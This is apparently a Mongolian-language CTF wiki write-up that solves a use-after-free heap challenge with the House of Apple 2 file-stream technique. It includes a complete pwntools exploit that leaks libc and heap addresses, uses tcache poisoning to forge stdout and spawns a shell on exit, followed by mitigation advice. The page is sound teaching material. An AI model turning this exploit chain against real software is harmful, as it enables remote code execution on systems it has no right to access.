---
title: House of Apple 2
description: Full RELRO + PIE бүхий UAF challenge дээр libc/heap leak хийж, tcache poisoning-оор _IO_2_1_stdout_-ийг хуурамч FILE болгож exit дээр system дуудах House of Apple 2 бодолт.
pagefind: false
---

[FSOP](../fsop/)-ийн **House of Apple 2** техникийг бодит challenge дээр хэрэгжүүлнэ. Алдаа нь
[tcache poisoning](../tcache-poison/)-тэй **яг ижил UAF** ч binary нь **Full RELRO + PIE** тул GOT
**зөвхөн уншигдах** — GOT дарах арга хаалттай. Иймээс бичих primitive-ээ `_IO_2_1_stdout_` руу чиглүүлж,
`exit(0)` → `_IO_flush_all` замыг урвуулж shell авна.

:::note[Юуны өмнө]
- **[FSOP](../fsop/)** — FILE бүтэц, `_IO_flush_all`, vtable шалгалт, House of Apple 2-ийн санаа (онол).
- **[tcache poisoning](../tcache-poison/)** — ижил UAF + poison primitive-ийг эндээс бүрэн ашиглана.
- Challenge-ийн libc нь **glibc 2.43**.
:::

## Бодлого

Notes цэсний программ — `add` / `edit` / `show` / `delete`. Алдаа нь [tcache poisoning](../tcache-poison/)-тэй
адил `delete`-д (`free` хийгээд заагчийг цэвэрлэдэггүй → UAF). Ялгаа нь **хамгаалалт** ба flag-ийн техник:

| Файл | Тайлбар |
|------|---------|
| [`main.c`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/userland/fsop/main.c) | Эх код (UAF) |
| [`fsop`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/userland/fsop/fsop) | Бэлэн binary |
| [`libc.so.6`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/userland/fsop/libc.so.6), [`ld-...`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/userland/fsop/ld-linux-x86-64.so.2) | Зориулалтын libc (2.43; offset таарна; [pwninit](../../tools/pwninit/) автоматжуулна) |

```console
$ pwn checksec fsop
    Arch:     amd64-64-little
    RELRO:    Full RELRO        # GOT зөвхөн унших -> GOT дарж болохгүй
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled       # binary base санамсаргүй (leak хэрэгтэй)
    RUNPATH:  b'$ORIGIN'
```

**Docker-ээр (сервер).** Бэлэн image GitHub (ghcr)-д байгаа. Татаж ажиллуулна:

```console
$ docker run --rm -p 1337:1337 ghcr.io/computer-communication-security-club/pwn-fsop:latest
```

:::caution[Spoiler]
Доорх хэсэгт бодолт байгаа. Эхлээд өөрөө оролдоод үзээрэй!
:::

## Бодолт

### 0. Бэлдэц

Алдаа ба цэсний формат [tcache poisoning](../tcache-poison/#0-бэлдэц)-тэй ижил тул мөн адил туслахуудыг ашиглана.
`show`-ийн хэвлэлт нь `write(1, notes[i], sizes[i])` тул `size`-г яг хэрэгтэй хэмжээгээр нь `add` хийвэл цэвэрхэн leak авна.

```python title="exploit.py"
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './fsop')
libc = ELF(args.LIBC or './libc.so.6', checksec=False)

host = args.HOST or 'localhost'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    return start_local(argv, *a, **kw) if args.LOCAL else start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

def add(i, s, d=b'A'):
    io.sendlineafter(b'> ', b'1'); io.sendlineafter(b'idx: ', str(i).encode())
    io.sendlineafter(b'size: ', str(s).encode()); io.sendafter(b'data: ', d)
def edit(i, d): io.sendlineafter(b'> ', b'2'); io.sendlineafter(b'idx: ', str(i).encode()); io.sendafter(b'data: ', d)
def show(i):    io.sendlineafter(b'> ', b'3'); io.sendlineafter(b'idx: ', str(i).encode()); return u64(io.recv(8).ljust(8, b'\x00'))
def dele(i):    io.sendlineafter(b'> ', b'4'); io.sendlineafter(b'idx: ', str(i).encode())
```

### 1. libc base leak (unsorted bin)

[tcache poisoning](../tcache-poison/#2-libc-хаягийг-leak-хийх)-тэй адил: том chunk-ийг `free` хийхэд
unsorted bin-д орж `fd` нь `main_arena+8` (libc доторх хаяг) болно. UAF `show`-оор уншина:

```python
add(0, 0x500); add(1, 0x20); dele(0)      # A (unsorted) + guard (top-той нийлэхээс сэргийлнэ)
libc.address = show(0) - 0x212ac8         # main_arena+8 -> libc base
add(0, 0x500)                             # A-г буцааж авна (цэвэрлэгээ)
log.info('libc = %#x', libc.address)
```

`0x212ac8` нь энэ libc дээрх `main_arena+8`-ийн libc base-ээс зай — gdb-ээр нэг удаа тогтооно:

```ansi
[1;31mpwndbg>[0m bins
unsortedbin
all: [34m0x555…5010[0m —▸ [34m0x78fcdc812ac8[0m [32m(main_arena+8)[0m ◂— …
[1;31mpwndbg>[0m p/x [34m0x78fcdc812ac8[0m - [34m0x78fcdc600000[0m   [90m# - libc base (vmmap libc)[0m
$1 = [34m0x212ac8[0m
```

### 2. heap base leak (safe-linking key)

tcache poison хийхэд [safe-linking](../../basics/heap/#safe-linking)-ийг тойрох `page>>12` хэрэгтэй.
tcache-д ганц chunk байхад `fd = page>>12` — шууд уншина. Энэ нь heap base-ийг ч өгнө (`key<<12`):

```python
add(2, 0xe0); add(3, 0xe0); dele(2)       # C, D (0xf0 chunk); C-г free
key = show(2); heap = key << 12           # fd = C>>12  ->  heap base
log.info('heap = %#x', heap)
```

```ansi
[1;31mpwndbg>[0m tcachebins
[34m0xf0[0m [ 1]: [34m0x5e181aed6b00[0m ◂— 0        [90m# key == (0x5e181aed6b00 >> 12),  heap == key<<12[0m
```

### 3. Яагаад GOT биш — stdout руу эргэнэ

[tcache poisoning](../tcache-poison/)-д бид `free@got`-ийг `system` болгодог байсан. Энд **Full RELRO** тул
GOT зөвхөн уншигдах — тэр арга унана. Оронд нь [FSOP](../fsop/): бичих primitive-ээ libc доторх
`_IO_2_1_stdout_` руу чиглүүлж, `exit(0)` → `_IO_flush_all` замыг урвуулна.

**Хуурамч FILE-ийн талбарууд** ([House of Apple 2](../fsop/#vtable-шалгалт-ба-түүнийг-тойрох)). Нэг жижиг
mallocated мужийг (`notes[4]`) `_wide_data` болгон ашиглана:

| Бүтэц | Talbar (offset) | Утга | Яагаад |
|-------|-----------------|------|--------|
| `_IO_2_1_stdout_` | `_flags` (`0x00`) | `b'  sh'` | эцэст `system(fp)` дуудагдахад `rdi` = FILE эхлэл = `"  sh"` |
| | `_IO_write_ptr` (`0x28`) | `1` | `_IO_write_ptr > _IO_write_base(0)` байж `_IO_OVERFLOW` дуудагдана |
| | `_lock` (`0x88`) | бичигдэх хаяг | `_IO_flush_all` түгжээ авна — буруу бол crash |
| | `_wide_data` (`0xa0`) | `&wide` (`notes[4]`) | `_IO_wdoallocbuf`-ийн хянагдах объект |
| | `vtable` (`0xd8`) | `_IO_wfile_jumps` | **зөвшөөрөгдсөн** vtable — `_IO_vtable_check` тойрно |
| `wide` (`notes[4]`) | `__doallocate` слот (`0x68`) | `system` | `_wide_vtable->__doallocate(fp)` = `system(fp)` |
| | `_wide_vtable` (`0xe0`) | `&wide` (өөрийгөө заана) | `0x68` дээрх `system`-ийг хүчинтэй болгоно |

```python
wide = heap + 0xa40                        # notes[4]-ийн heap-ээс offset (gdb-ээр тогтоов)
add(4, 0x200, flat({
    0x68: libc.sym['system'],              # хуурамч _wide_vtable->__doallocate
    0xe0: wide,                            # _wide_data->_wide_vtable = өөрөө
}, filler=b'\0', length=0xe8))
```

### 4. stdout-ийг poison хийж дарах

Одоо [tcache poisoning](../tcache-poison/#4-tcache-ийг-poison-хийх)-оор `_IO_2_1_stdout_` дээр chunk
"гаргаж" аваад, бодит `stdout` бүтцийг дарна. `0xf0` tcache-д dangling `notes[3]` (D) байгаа тул `fd`-г
`stdout` руу mangle хийнэ:

```python
stdout = libc.sym['_IO_2_1_stdout_']
dele(3); edit(3, p64(key ^ stdout))        # D.fd -> mangle(&_IO_2_1_stdout_)
add(5, 0xe0)                               # -> D
add(6, 0xe0, flat({                        # -> &_IO_2_1_stdout_  (дарж бичнэ)
    0x00: b'  sh',                         # _flags  -> system("  sh")
    0x28: 1,                               # _IO_write_ptr > _IO_write_base
    0x88: wide + 0x100,                    # _lock (бичигдэх, тэг биш хаяг)
    0xa0: wide,                            # _wide_data
    0xd8: libc.sym['_IO_wfile_jumps'],     # vtable
}, filler=b'\0', length=0xe0))
```

`add(6, …)`-ийн дараа `stdout.vtable` нь `_IO_wfile_jumps` болж, `_wide_data` нь бидний `wide` руу заана:

```ansi
[1;31mpwndbg>[0m p (void*)((struct _IO_FILE_plus*)&_IO_2_1_stdout_)->vtable
$1 = [34m0x78fcdc811228[0m [32m<_IO_wfile_jumps>[0m
```

### 5. exit → shell

`exit(0)` (цэсний `5`) дуудахад гинж ажиллана:
`_IO_flush_all` → `_IO_wfile_overflow(stdout)` → `_IO_wdoallocbuf` →
`wide->_wide_vtable->__doallocate(stdout)` = `system("  sh")`:

```python
io.sendlineafter(b'> ', b'5')              # exit(0) -> House of Apple 2 -> system("  sh")
io.interactive()
```

### 6. Exploit

<details>
<summary>Бүрэн exploit</summary>

```python title="exploit.py"
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './fsop')
libc = ELF(args.LIBC or './libc.so.6', checksec=False)

host = args.HOST or 'localhost'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    return start_local(argv, *a, **kw) if args.LOCAL else start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

def add(i, s, d=b'A'):
    io.sendlineafter(b'> ', b'1'); io.sendlineafter(b'idx: ', str(i).encode())
    io.sendlineafter(b'size: ', str(s).encode()); io.sendafter(b'data: ', d)
def edit(i, d): io.sendlineafter(b'> ', b'2'); io.sendlineafter(b'idx: ', str(i).encode()); io.sendafter(b'data: ', d)
def show(i):    io.sendlineafter(b'> ', b'3'); io.sendlineafter(b'idx: ', str(i).encode()); return u64(io.recv(8).ljust(8, b'\x00'))
def dele(i):    io.sendlineafter(b'> ', b'4'); io.sendlineafter(b'idx: ', str(i).encode())

# 1. libc base (unsorted bin fd = main_arena+8)
add(0, 0x500); add(1, 0x20); dele(0)
libc.address = show(0) - 0x212ac8; add(0, 0x500)

# 2. heap base (safe-linking key = page>>12)
add(2, 0xe0); add(3, 0xe0); dele(2)
key = show(2); heap = key << 12
log.info('libc = %#x  heap = %#x', libc.address, heap)

# 3. хуурамч _wide_data (notes[4])
wide = heap + 0xa40
add(4, 0x200, flat({0x68: libc.sym['system'], 0xe0: wide}, filler=b'\0', length=0xe8))

# 4. tcache poison -> _IO_2_1_stdout_, дараа нь дарж бичнэ (House of Apple 2)
stdout = libc.sym['_IO_2_1_stdout_']
dele(3); edit(3, p64(key ^ stdout))
add(5, 0xe0)
add(6, 0xe0, flat({
    0x00: b'  sh',
    0x28: 1,
    0x88: wide + 0x100,
    0xa0: wide,
    0xd8: libc.sym['_IO_wfile_jumps'],
}, filler=b'\0', length=0xe0))

# 5. exit -> _IO_flush_all -> system("  sh")
io.sendlineafter(b'> ', b'5')
io.interactive()
```

</details>

```console
$ ./exploit.py LOCAL
[*] libc = 0x78fcdc600000  heap = 0x5e181aed6000
[*] Switching to interactive mode
$ cat flag.txt
flag{fs0p_h0us3_0f_4ppl3_2_v1a_std0ut}
```

```console
$ ./exploit.py HOST=ctf.example.com PORT=31337
```

:::tip[Яагаад `_wide_data` руу — vtable check]
Хуучин FSOP (`_IO_OVERFLOW`-ийг шууд `system` болгох) нь `_IO_vtable_check`-д унадаг — vtable нь зөвхөн
`__libc_IO_vtables` мужид байж болно. House of Apple 2 нь vtable-ийг **хэвийн** `_IO_wfile_jumps` болгодог тул
шалгалт давдаг бөгөөд хяналтыг `_wide_data->_wide_vtable` руу шилжүүлж цааш үргэлжилдэг.
:::

## Хамгаалалт

- **UAF-ийг арилга** — `free(p)`-ийн дараа `p = NULL`. Энэ ганц алхам бүх гинжийг таслана.
- **Full RELRO + PIE** нь GOT болон кодын хаягийг хамгаалсан ч FSOP (libc доторх FILE бүтэц) түүгээр
  зогсдоггүй — heap primitive байвал libc leak-ээр тойрно.
- glibc `_IO_vtable_check` нь энгийн vtable солилтыг барьдаг; House of Apple 2 нь түүнийг тойрдог тул
  найдвартай хамгаалалт биш.
- Жинхэнэ шийдэл нь heap алдааг (UAF, overflow) анхнаас нь гаргахгүй байх.

## Эх сурвалж

- [roderick on House of Apple 2 (原创)](https://bbs.kanxue.com/thread-273832.htm) — анхны тайлбар (хятад)
- [FSOP ба `_IO_FILE` дотоод бүтэц (Angelboy / HITCON)](https://blog.angelboy.tw/2021/09/hitcon-ctf-2021-fsop.html)
- [Safe-linking (Check Point)](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/)
- [how2heap (shellphish)](https://github.com/shellphish/how2heap)
